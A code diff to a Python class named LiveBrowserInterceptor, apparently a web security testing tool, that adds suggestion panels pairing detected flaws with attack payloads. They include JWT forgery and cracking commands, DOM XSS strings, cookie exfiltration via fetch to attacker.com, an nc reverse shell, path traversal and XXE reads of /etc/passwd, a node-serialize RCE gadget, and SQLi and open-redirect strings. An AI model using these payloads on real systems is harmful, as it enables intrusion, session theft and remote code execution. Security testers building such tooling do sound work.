@@ -1754,21 +1754,56 @@ class LiveBrowserInterceptor:
                 specific_suggestions['JWT'] = {
                     'title': '🔑 JWT Found — Test for Algorithm Confusion & Weak Secrets',
                     'color': '#ff3333',
-                    'text': '- <strong>Finding:</strong> JWT token detected in traffic/response.<br>- <strong>Test 1 — Algorithm: none attack:</strong> Decode the JWT (base64), change "alg":"HS256" to "alg":"none", strip the signature. If accepted → critical auth bypass.<br>- <strong>Test 2 — Weak secret brute-force:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">hashcat -a 0 -m 16500 &lt;jwt&gt; wordlist.txt<br>python3 jwt_tool.py &lt;jwt&gt; -C -d wordlist.txt</code><br>- <strong>Test 3 — RS256 → HS256 confusion:</strong> Sign with the server's public key as the HS256 secret → server may accept it.'
+                    'text': '- <strong>Finding:</strong> JWT token detected in traffic/response.<br>- <strong>Test 1 — Algorithm: none attack:</strong> Decode the JWT (base64), change "alg":"HS256" to "alg":"none", strip the signature. If accepted → critical auth bypass.<br>- <strong>Test 2 — Weak secret brute-force:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">hashcat -a 0 -m 16500 &lt;jwt&gt; wordlist.txt<br>python3 jwt_tool.py &lt;jwt&gt; -C -d wordlist.txt</code><br>- <strong>Test 3 — RS256 → HS256 confusion:</strong> Sign with the server\'s public key as the HS256 secret → server may accept it.'
                 }
-            elif 'CONFIRMED_RUNTIME_DOM_SINK_FUNCTION_CTOR' in t or 'EVAL' in t:
+            elif 'CONFIRMED_RUNTIME_DOM_SINK_FUNCTION_CTOR' in t or 'DOM_XSS_NEW_FUNCTION' in t or 'EVAL' in t:
                 specific_suggestions['DOM_XSS_EVAL'] = {
                     'title': '🌐 Confirmed DOM XSS — Function() Constructor / Eval Sink',
                     'color': '#ff3333',
-                    'text': '- <strong>Vulnerability:</strong> Data flows into new Function() or eval().<br>- <strong>Payloads (break out of any surrounding string context):</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">alert(1) (direct injection)<br>\");alert(1);// (string escape)<br>'}-alert(1)-x={ (object context)</code><br>- <strong>Data exfil:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">fetch(`https://attacker.com/?d=${btoa(document.cookie)}`)</code>'
+                    'text': '- <strong>Vulnerability:</strong> Data flows into new Function() or eval().<br>- <strong>Payloads (break out of any surrounding string context):</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">alert(1) (direct injection)<br>\\");alert(1);// (string escape)<br>\'}-alert(1)-x={ (object context)</code><br>- <strong>Data exfil:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">fetch(`https://attacker.com/?d=${btoa(document.cookie)}`)</code>'
                 }
-            elif 'CONFIRMED_RUNTIME_DOM_SINK_INNERHTML' in t or 'OUTERHTML' in t:
+            elif 'CONFIRMED_RUNTIME_DOM_SINK_INNERHTML' in t or 'DOM_XSS_INNERHTML' in t or 'DOM_XSS_OUTERHTML' in t or 'DOM_XSS_DOC_WRITE' in t or 'OUTERHTML' in t:
                 specific_suggestions['DOM_XSS_HTML'] = {
-                    'title': '🌐 Confirmed DOM XSS — innerHTML/outerHTML Sink',
+                    'title': '🌐 Confirmed DOM XSS — HTML Parser Sink',
                     'color': '#ff3333',
                     'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser sink.<br>- <strong>Constraint:</strong> &lt;script&gt; tags do NOT execute via innerHTML. Use event-handler elements.<br>- <strong>Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=alert(document.domain)&gt;<br>&lt;svg/onload=alert(1)&gt;<br>&lt;details/open/ontoggle=alert(1)&gt;</code><br>- <strong>Cookie steal:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)&gt;</code>'
                 }
-
+            elif 'COMMAND_INJECTION_NODE' in t:
+                specific_suggestions['COMMAND_INJECTION'] = {
+                    'title': '💀 Command Injection — Node.js os.exec',
+                    'color': '#ff0000',
+                    'text': '- <strong>Vulnerability:</strong> Untrusted data is concatenated into a shell command.<br>- <strong>Impact:</strong> Remote Code Execution (RCE). Full system compromise.<br>- <strong>Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">; id<br>| whoami<br>`cat /etc/passwd`<br>$(nc attacker.com 4444 -e /bin/bash)</code>'
+                }
+            elif 'PATH_TRAVERSAL_NODE' in t:
+                specific_suggestions['PATH_TRAVERSAL'] = {
+                    'title': '📁 Path Traversal / LFI',
+                    'color': '#ff6600',
+                    'text': '- <strong>Vulnerability:</strong> Untrusted input controls file paths.<br>- <strong>Impact:</strong> Read arbitrary files from the filesystem.<br>- <strong>Payloads:</strong><br><code style="color:#ffaa66; background:#111; padding:2px; display:block; margin:4px 0;">../../../../../../etc/passwd<br>..%2f..%2f..%2f..%2fetc%2fpasswd<br>....//....//....//etc//passwd</code>'
+                }
+            elif 'XXE_DOMPARSER' in t:
+                specific_suggestions['XXE'] = {
+                    'title': '📜 XML External Entity (XXE)',
+                    'color': '#ff6600',
+                    'text': '- <strong>Vulnerability:</strong> Insecure XML parser allows external entities.<br>- <strong>Impact:</strong> Read local files, SSRF, or denial of service.<br>- <strong>Payload:</strong><br><pre style="color:#ffaa66; background:#111; padding:6px; margin:4px 0; font-size:10px;">&lt;?xml version="1.0"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</pre>'
+                }
+            elif 'INSECURE_DESERIALIZATION_NODE' in t or 'INSECURE_DESERIALIZATION_EVAL' in t:
+                specific_suggestions['DESERIALIZATION'] = {
+                    'title': '🔥 Insecure Deserialization',
+                    'color': '#ff0000',
+                    'text': '- <strong>Vulnerability:</strong> Untrusted data is deserialized directly.<br>- <strong>Impact:</strong> Remote Code Execution (RCE).<br>- <strong>Strategy:</strong> In Node.js (e.g. node-serialize), craft IIFE functions that execute upon deserialization.<br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,s,SE){console.log(s)});}()"}</code>'
+                }
+            elif 'CLIENT_SIDE_SQLI' in t or 'WEBSQL_INJECTION' in t:
+                specific_suggestions['SQLI'] = {
+                    'title': '💉 Client-Side SQL Injection',
+                    'color': '#ff6600',
+                    'text': '- <strong>Vulnerability:</strong> Untrusted data concatenated into WebSQL/SQLite queries.<br>- <strong>Impact:</strong> Local data leakage or modification.<br>- <strong>Payloads:</strong><br><code style="color:#ffaa66; background:#111; padding:2px; display:block; margin:4px 0;">\' OR 1=1--<br>" UNION SELECT * FROM sensitive_table--</code>'
+                }
+            elif 'OPEN_REDIRECT_LOCATION' in t:
+                specific_suggestions['OPEN_REDIRECT'] = {
+                    'title': '↪️ DOM-based Open Redirect',
+                    'color': '#ffcc00',
+                    'text': '- <strong>Vulnerability:</strong> `location.href` or similar sink is assigned untrusted data from `location.hash` or `location.search`.<br>- <strong>Impact:</strong> Phishing, token leakage, or XSS (via javascript: URIs).<br>- <strong>Payloads:</strong><br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">https://attacker.com<br>//attacker.com<br>javascript:alert(1)</code>'
+                }
         if not specific_suggestions:
             suggestions_html += """
             <div style="margin-top:20px; padding:15px; border:1px solid #333; background:#111; color:#888; text-align:center; border-radius:4px; font-size:11px;">
